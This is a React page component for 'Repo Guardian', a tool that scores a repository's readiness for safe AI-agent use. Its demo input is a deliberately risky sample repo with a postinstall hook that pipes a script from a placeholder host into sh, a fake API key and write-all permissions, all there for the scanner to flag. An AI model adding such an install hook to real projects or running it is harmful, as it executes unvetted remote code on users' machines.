"use client";

import { useState } from "react";
import { postStudio } from "@/components/studio/StudioUI";
import { ActionButton } from "@/components/ui/ActionButton";
import { CopyButton } from "@/components/ui/CopyButton";
import { DownloadButton } from "@/components/ui/DownloadButton";
import { EmptyState } from "@/components/ui/EmptyState";
import { ErrorMessage } from "@/components/ui/ErrorMessage";
import { FormField } from "@/components/ui/FormField";
import { MetricCard } from "@/components/ui/MetricCard";
import { ResultCard } from "@/components/ui/ResultCard";
import { StatusBadge } from "@/components/ui/StatusBadge";
import { StudioShell } from "@/components/ui/StudioShell";
import type { RepoGuardianResult } from "@/lib/studio/repoGuardian";

const demo = `# Demo Agent Repository
Purpose: local customer-support planning agent.
package.json scripts: build, lint, test
MCP config allows filesystem and network tools.
permissions: write-all
postinstall: curl https://unknown.example/install.sh | sh
API_KEY="demo_fake_repo_secret"
No CODEOWNERS or required approval documented.`;

export default function RepoGuardianPage() {
  const [content, setContent] = useState("");
  const [projectName, setProjectName] = useState("Demo Agent Repository");
  const [result, setResult] = useState<RepoGuardianResult | null>(null);
  const [selectedFile, setSelectedFile] = useState("");
  const [activeAction, setActiveAction] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  async function analyze() {
    if (activeAction) return;
    setActiveAction("analyze"); setError(null);
    try {
      const next = await postStudio<RepoGuardianResult>("/api/studio/repo-guardian", { content, projectName });
      setResult(next); setSelectedFile(next.recommendedFiles[0]?.path ?? "");
    } catch (err) {
      console.error("Repo Guardian failed:", err);
      setError(err instanceof Error ? err.message : "Something went wrong.");
    } finally { setActiveAction(null); }
  }

  const file = result?.recommendedFiles.find((item) => item.path === selectedFile);
  return <StudioShell
    currentStep={result ? 2 : activeAction ? 1 : content ? 1 : 0}
    description="Check whether a repo is ready for safe AI-agent use."
    eyebrow="Agent Control Tower IQ"
    steps={["Input", "Analyze", "Review"]}
    title="Repo Guardian"
    left={<div className="panel space-y-5 rounded-xl p-5">
      <h2 className="font-semibold text-slate-950">Repository input</h2>
      <FormField label="Project name"><input className="studio-input" disabled={Boolean(activeAction)} onChange={(event) => setProjectName(event.target.value)} value={projectName} /></FormField>
      <FormField label="Repo text, README, package.json, or config"><textarea className="studio-textarea min-h-80" disabled={Boolean(activeAction)} onChange={(event) => { setContent(event.target.value); setResult(null); }} placeholder="Paste synthetic repository context here." value={content} /></FormField>
      <ErrorMessage message={error} />
      <div className="grid gap-3">
        <ActionButton disabled={Boolean(activeAction)} label="Load Repo Demo" onClick={() => { setContent(demo); setResult(null); setError(null); }} variant="secondary" />
        <ActionButton disabled={Boolean(activeAction) || !content.trim()} isLoading={activeAction === "analyze"} label="Analyze Repo" loadingLabel="Analyzing Repo..." onClick={analyze} />
      </div>
    </div>}
    right={!result ? <EmptyState title="Analyze a repository to see readiness and recommended files." /> : <div className="space-y-4">
      <div className="grid gap-4 sm:grid-cols-2">
        <MetricCard action={<StatusBadge status={result.decision} />} detail={result.summary} label="Readiness Score" value={`${result.readinessScore}/100`} />
        <ResultCard title="Top Risks"><ul className="space-y-2">{result.risks.slice(0, 5).map((risk) => <li key={risk}>• {risk}</li>)}</ul></ResultCard>
      </div>
      <ResultCard title="Recommended Files">
        <div className="flex flex-wrap gap-2">{result.recommendedFiles.map((item) => <ActionButton key={item.path} label={item.path} onClick={() => setSelectedFile(item.path)} variant="secondary" />)}</div>
      </ResultCard>
      {file ? <details className="rounded-xl border border-slate-200 bg-white p-4"><summary className="cursor-pointer font-semibold text-slate-950">Preview {file.path}</summary><div className="mt-4"><ResultCard action={<div className="flex gap-2"><CopyButton value={file.content} /><DownloadButton content={file.content} filename={file.path} /></div>} title={file.path}><p>{file.description}</p><pre className="studio-preview mt-3">{file.content}</pre></ResultCard></div></details> : null}
    </div>}
  />;
}
